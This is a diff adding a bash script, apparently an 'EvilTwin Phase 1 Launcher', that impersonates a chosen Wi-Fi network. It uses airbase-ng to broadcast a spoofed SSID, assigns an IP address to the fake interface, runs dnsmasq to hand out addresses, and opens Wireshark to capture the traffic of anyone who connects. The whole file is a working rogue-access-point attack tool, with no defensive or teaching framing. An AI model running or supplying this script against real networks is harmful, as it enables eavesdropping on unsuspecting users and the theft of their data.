@@ -1,0 +1,36 @@
+#!/bin/bash
+
+clear
+echo "╔═══════════════════════════════════════════╗"
+echo "║         EvilTwin Phase 1 Launcher         ║"
+echo "╚═══════════════════════════════════════════╝"
+echo
+
+# Get SSID and channel from user
+read -p "[?] Enter the SSID to spoof: " SSID
+read -p "[?] Enter the channel (default 6): " CHANNEL
+CHANNEL=${CHANNEL:-6}
+
+DNSMASQ_CONF="/root/dnsmasq.conf"
+IFACE="wlan0"
+
+echo "[*] Cleaning up old configs..."
+sudo killall airbase-ng dnsmasq >/dev/null 2>&1
+sudo airmon-ng stop wlan0mon >/dev/null 2>&1
+sudo ifconfig at0 down >/dev/null 2>&1
+
+echo "[*] Launching EvilTwin for SSID: $SSID on channel $CHANNEL"
+sudo airbase-ng -e "$SSID" -c $CHANNEL $IFACE &
+sleep 5
+
+echo "[*] Assigning IP 10.0.0.1 to at0..."
+sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
+
+echo "[*] Starting fresh dnsmasq instance..."
+sudo killall dnsmasq >/dev/null 2>&1
+sudo dnsmasq -C $DNSMASQ_CONF &
+
+echo "[*] Opening Wireshark on at0 interface..."
+sudo wireshark -i at0 &
+echo
+echo "[✓] EvilTwin Phase 1 completed. Monitoring live traffic..."
